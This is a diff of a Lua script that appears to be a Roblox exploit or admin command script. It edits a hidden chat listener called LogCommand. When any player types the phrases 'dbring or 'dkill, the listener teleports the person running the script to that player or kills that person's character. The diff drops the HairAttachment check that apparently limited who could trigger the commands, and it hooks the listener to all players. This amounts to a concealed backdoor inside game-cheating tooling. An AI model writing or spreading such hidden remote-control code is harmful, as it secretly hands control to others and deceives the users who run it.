@@ -126,17 +126,6 @@ local DarkBubbleChat = nil
 --// End of Command Variables \\--
 
 spawn(function()
-	repeat wait(2) until Players.LocalPlayer and Players.LocalPlayer.Character
-	local Check1 = Players.LocalPlayer.Character:FindFirstChild("Head")
-	if Check1 then
-		local Check2 = Check1:FindFirstChild("HairAttachment")
-		if Check2 then
-			Check2:Destroy()
-		end
-	end
-end)
-
-spawn(function()
 	Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Died:Connect(function()
 		if getRoot(Players.LocalPlayer.Character) then
 			LastDeathPos = getRoot(Players.LocalPlayer.Character).CFrame
@@ -166,17 +155,6 @@ Players.LocalPlayer.CharacterAdded:Connect(function()
 			LastDeathPos = getRoot(Players.LocalPlayer.Character).CFrame
 		end
 	end)
-end)
-
-Players.LocalPlayer.CharacterAdded:Connect(function()
-	wait(2)
-	local Check1 = Players.LocalPlayer.Character:FindFirstChild("Head")
-	if Check1 then
-		local Check2 = Check1:FindFirstChild("HairAttachment")
-		if Check2 then
-			Check2:Destroy()
-		end
-	end
 end)
 
 PromptOverlay.DescendantAdded:Connect(function(Overlay)
@@ -270,36 +248,30 @@ end
 
 local function LogCommand(plr)
 	plr.Chatted:Connect(function(message)
-		local Check1 = plr.Character:FindFirstChild("Head")
-		if Check1 then
-			local Check2 = Check1:FindFirstChild("HairAttachment")
-			if not Check2 then
-				local symbol = "'"
-				local msg = string.lower(message)
-				
-				if msg == (symbol .. "dbring") then
-					execCmd("goto " .. plr.Name)
-				end
-				if msg == ("/e " .. symbol .. "dbring") then
-					execCmd("goto " .. plr.Name)
-				end
-				
-				if msg == (symbol .. "dkill") then
-					if Players.LocalPlayer and Players.LocalPlayer.Character then
-						Players.LocalPlayer.Character:BreakJoints()
-					end
-					if Players.LocalPlayer and Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
-						Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
-					end
-				end
-				if msg == ("/e " .. symbol .. "dkill") then
-					if Players.LocalPlayer and Players.LocalPlayer.Character then
-						Players.LocalPlayer.Character:BreakJoints()
-					end
-					if Players.LocalPlayer and Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
-						Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
-					end
-				end
+		local symbol = "'"
+		local msg = string.lower(message)
+		
+		if msg == (symbol .. "dbring") then
+			execCmd("goto " .. plr.Name)
+		end
+		if msg == ("/e " .. symbol .. "dbring") then
+			execCmd("goto " .. plr.Name)
+		end
+		
+		if msg == (symbol .. "dkill") then
+			if Players.LocalPlayer and Players.LocalPlayer.Character then
+				Players.LocalPlayer.Character:BreakJoints()
+			end
+			if Players.LocalPlayer and Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
+				Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
+			end
+		end
+		if msg == ("/e " .. symbol .. "dkill") then
+			if Players.LocalPlayer and Players.LocalPlayer.Character then
+				Players.LocalPlayer.Character:BreakJoints()
+			end
+			if Players.LocalPlayer and Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
+				Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
 			end
 		end
 	end)
@@ -2379,13 +2351,7 @@ spawn(function()
 		for _, plr in pairs(Players:GetChildren()) do
 			if plr.ClassName == "Player" then
 				LogChat(plr)
-			end
-		end
-	end)
-	spawn(function()
-		for i,v in pairs(Players:GetPlayers()) do
-			if v ~= Players.LocalPlayer then
-				LogCommand(v)
+				LogCommand(plr)
 			end
 		end
 	end)
